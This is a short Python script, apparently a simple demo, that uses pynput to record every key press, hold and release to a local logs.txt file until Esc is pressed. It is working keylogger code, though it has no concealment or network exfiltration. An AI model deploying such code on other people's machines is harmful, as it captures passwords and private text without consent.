from pynput.keyboard import Key, Listener


new_line = False
is_holding_key = False

def update(text):
    with open(f"logs.txt", "a") as f:
        f.write(text)


def press(key):
    global new_line, is_holding_key
    key_pressed = str(key).replace("'", "")
    if key_pressed.startswith("Key"):
        if new_line:
            update('\n')
            new_line = False
        key_pressed = key_pressed.replace("Key.", "")
        if is_holding_key:
            update(f"\t\tH:{key_pressed}\n")       # H: Holding
        else:
            update(f"\tP:{key_pressed}\n")         # P: Pressed
            is_holding_key = True
    else:
        update(key_pressed)
        new_line = True


def release(key):
    global is_holding_key
    key_pressed = str(key).replace("'", "")
    if key_pressed.startswith("Key"):
        key_pressed = key_pressed.replace("Key.", "")
        update(f"\tR:{key_pressed}\n")             # R: Released
        is_holding_key = False
        if str(key) == "Key.esc":
            exit()


with Listener(on_press=press, on_release=release) as listener:
    listener.join()